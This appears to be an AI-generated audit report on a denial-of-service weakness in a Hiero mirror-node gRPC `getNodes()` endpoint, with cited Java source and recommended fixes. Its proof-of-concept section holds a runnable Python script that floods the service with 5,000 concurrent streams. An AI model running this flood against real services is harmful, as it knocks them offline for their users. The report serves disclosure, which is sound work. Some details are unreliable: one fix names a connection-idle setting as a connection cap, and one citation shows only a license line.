All code references have been verified against the actual source. Here is the result:

---

# Audit Report

## Title
Unbounded TCP Connection Multiplexing on `getNodes()` Enables Unauthenticated Resource Exhaustion DoS

## Summary
`NetworkController.getNodes()` accepts unauthenticated requests with no per-IP or per-client connection limit. The sole server-side guard — `maxConcurrentCallsPerConnection = 5` — caps HTTP/2 streams per TCP connection but imposes no bound on the number of TCP connections a single client may open. An attacker can open thousands of TCP connections to drive thousands of simultaneous database-backed calls, exhausting the HikariCP connection pool and the Reactor `boundedElastic` scheduler.

## Finding Description

**`NetworkController.getNodes()`** (lines 33–43) accepts any `AddressBookQuery` with no credential check and immediately fans out to `networkService::getNodes`: [1](#0-0) 

**`NetworkServiceImpl.getNodes()`** issues three synchronous DB queries before entering the paginated streaming loop — a timestamp lookup on the address book, a timestamp lookup on node stakes, and a full node-stake map load: [2](#0-1) 

The paginated loop then issues additional DB queries per page and holds a `boundedElastic` scheduler thread for the duration: [3](#0-2) 

**The only server-side guard** is `maxConcurrentCallsPerConnection`, set in `GrpcConfiguration`: [4](#0-3) 

This is a Netty per-connection HTTP/2 stream cap. No `maxConnections`, `maxConnectionAge`, `permitKeepAliveWithoutCalls`, or per-IP limit is configured anywhere in the gRPC module — confirmed by the absence of any such configuration in `GrpcConfiguration.java` and a negative search across all `grpc/src/main/**/*.java`.

**No production rate-limiting interceptor exists.** The only `ServerInterceptor` in the gRPC module is `GrpcInterceptor`, which lives under `src/test/java` and merely sets an endpoint-context string: [5](#0-4) 

The `ThrottleManagerImpl` rate-limiting infrastructure exists only in the `web3` module and is never wired into the gRPC service: [6](#0-5) 

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` constitutes a meaningful rate limit. It does not — it is a per-connection HTTP/2 stream cap. An attacker opens N TCP connections to achieve N × 5 concurrent calls from a single IP, completely bypassing this guard.

## Impact Explanation
Each concurrent `getNodes()` call acquires a HikariCP database connection for the three upfront queries and then holds a `boundedElastic` scheduler thread for the paginated streaming loop. With N=1,000 TCP connections (trivially achievable from a single host), an attacker drives 5,000 simultaneous DB-backed calls. This exhausts the HikariCP pool, causing all subsequent DB operations across the gRPC pod to queue or fail, and saturates the `boundedElastic` thread pool. Because the mirror-node gRPC service is typically deployed as a small replica set, a single attacker targeting all pods simultaneously can take down a significant fraction of gRPC processing capacity without any credential guessing.

## Likelihood Explanation
The endpoint is publicly documented and requires zero credentials. Any attacker with network access to port 5600 (or the nginx proxy on 8080) can execute this with a standard gRPC client library. HTTP/2 connection establishment is cheap; opening 1,000 connections from a single machine is routine. No special knowledge, tokens, or prior access is required.

## Recommendation
1. **Add a `maxConnections` limit** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionIdle()` and a total connection cap to bound the number of simultaneous TCP connections.
2. **Add `maxConnectionAge` and `maxConnectionAgeGrace`** to force periodic connection recycling and prevent indefinite connection holding.
3. **Implement a server-side rate-limiting `ServerInterceptor`** (production, not test-only) in `grpc/src/main/` that enforces per-IP call rate limits using a token bucket or similar mechanism, analogous to the `ThrottleManagerImpl` already present in the `web3` module.
4. **Set `permitKeepAliveWithoutCalls(false)`** and a `permitKeepAliveTime` to reject clients that hold idle connections.
5. Consider deploying an infrastructure-level connection limit (e.g., nginx `limit_conn`) in front of the gRPC port.

## Proof of Concept
```python
import grpc
import threading
from hedera import mirror_network_service_pb2_grpc, mirror_network_service_pb2

TARGET = "mirror-node-grpc:5600"
NUM_CONNECTIONS = 1000
STREAMS_PER_CONN = 5

def flood(i):
    channel = grpc.insecure_channel(TARGET)
    stub = mirror_network_service_pb2_grpc.NetworkServiceStub(channel)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(
            target=lambda: list(stub.getNodes(mirror_network_service_pb2.AddressBookQuery()))
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
```
This opens 1,000 TCP connections each carrying 5 concurrent `getNodes` streams (5,000 total), each triggering at least 3 DB queries, exhausting the HikariCP pool with no authentication required.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L61-66)
```java
        long addressBookTimestamp = addressBookRepository
                .findLatestTimestamp(fileId.getId())
                .orElseThrow(() -> new EntityNotFoundException(fileId));
        long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp().orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
        var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
        var context = new AddressBookContext(addressBookTimestamp, nodeStakeMap);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L68-76)
```java
        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java (L13-21)
```java
public class GrpcInterceptor implements ServerInterceptor {

    @Override
    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(
            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
        final var methodName = fullMethod.substring(fullMethod.lastIndexOf('.') + 1);
        EndpointContext.setCurrentEndpoint(methodName);
        return next.startCall(call, headers);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L1-1)
```java
// SPDX-License-Identifier: Apache-2.0
```
